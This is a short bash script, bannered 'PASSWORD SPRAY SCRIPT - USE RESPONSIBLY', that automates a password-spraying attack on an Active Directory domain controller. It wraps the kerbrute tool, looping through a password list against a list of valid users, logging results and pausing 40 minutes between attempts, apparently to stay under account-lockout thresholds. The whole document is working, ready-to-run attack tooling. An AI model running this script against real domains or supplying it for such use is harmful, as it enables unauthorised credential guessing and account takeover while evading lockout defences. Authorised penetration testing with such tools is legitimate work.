#!/bin/bash

echo "####################################################################################################"
echo "#                                                                                                  #"
echo "#                                            /\\     /\\                                             #"
echo "#                                           /  \\___/  \\                                           #"
echo "#                                          /            \\                                         #"
echo "#                                          |  0      0  |                                         #"
echo "#                                          |    (())    |                                         #"
echo "#                                           \\  /''''\\  /                                          #"
echo "#                                          /^\\/ ^ ^ \\/^\\                                         #"
echo "#                                          \\  / ~~~ \\  /                                          #"
echo "#                                            /\\  -  /\\                                            #"
echo "#                                           / /-----\\ \\                                           #"
echo "#                                          /_/       \\_\\                                          #"
echo "#                                                                                                  #"
echo "#                             PASSWORD SPRAY SCRIPT - USE RESPONSIBLY                             #"
echo "#                                                                                                  #"
echo "####################################################################################################"
echo

# Prompt for domain controller IP, domain name, password list filename, and valid users file
read -ep "Enter the Domain Controller IP: " DC_IP
read -ep "Enter the Domain: " DOMAIN
read -ep "Enter the password list filename: " PASSWORD_LIST_FILE
read -ep "Enter the valid users filename: " VALID_USERS_FILE

# Check if the password list file exists
if [[ ! -f "$PASSWORD_LIST_FILE" ]]; then
    echo "Password list file ($PASSWORD_LIST_FILE) not found. Exiting."
    exit 1
fi

# Check if the valid users file exists
if [[ ! -f "$VALID_USERS_FILE" ]]; then
    echo "Valid users file ($VALID_USERS_FILE) not found. Exiting."
    exit 1
fi

# Start password spraying
echo '[+] Starting password spraying...'
echo

# Loop through each password in the specified password list file
while read -r pass; do
    echo "[+] Testing $pass..."
    output=$(./kerbrute_linux_amd64 passwordspray --dc $DC_IP -d $DOMAIN "$VALID_USERS_FILE" "$pass")
    echo "$output"
    echo "$output" >> kerbrute_passwordspray.out
    echo
    echo '[+] Sleeping for 40 minutes...'
    echo
    sleep 40m
done < "$PASSWORD_LIST_FILE"

# End password spraying
echo '[+] Ending password spraying'
